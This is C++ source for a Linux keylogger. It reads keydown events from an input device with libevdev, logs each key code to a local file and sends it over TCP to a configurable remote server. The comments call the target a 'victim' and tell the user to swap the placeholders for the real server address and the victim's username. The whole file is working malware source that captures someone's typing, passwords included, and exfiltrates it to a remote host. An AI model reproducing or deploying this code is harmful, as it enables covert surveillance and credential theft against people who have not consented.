#include <boost/asio.hpp>
#include <fstream>
#include <iostream>
#include <libevdev-1.0/libevdev/libevdev.h>
#include <string>

namespace asio = boost::asio;
using asio::ip::tcp;

const char *IP_ADDRESS = "127.0.0.1"; // replace with server IP address
const char *PORT = "8686";            // replace with server port number

int main() {
    std::string username = "victim"; // replace with code to get victim's username

    asio::io_context io_context;
    tcp::socket socket(io_context);

    // Connect to server
    tcp::resolver resolver(io_context);
    asio::connect(socket, resolver.resolve(IP_ADDRESS, PORT));

    // Send username to server
    asio::write(socket, asio::buffer(username + "\n"));

    // Open the input device
    struct libevdev *dev = nullptr;
    int fd = open("/dev/input/event0", O_RDONLY);
    int rc = libevdev_new_from_fd(fd, &dev);
    if (rc < 0) {
        std::cerr << "Failed to open device" << std::endl;
        return 1;
    }
    std::ofstream outfile("log.txt");
    // Read events from input device
    while (true) {
        struct input_event ev;
        rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_NORMAL, &ev);
        if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
            if (ev.type == EV_KEY && ev.value == 1) { // only send keydown events
                std::string message = "Key: " + std::to_string(ev.code) +
                                      ", Time:" + std::to_string(ev.time.tv_sec) + "." +
                                      std::to_string(ev.time.tv_usec) + "\n";
                asio::write(socket, asio::buffer(message));
                outfile << message;
            }
        }
    }

    // Close the input device
    outfile.close();
    libevdev_free(dev);
    close(fd);

    return 0;
}
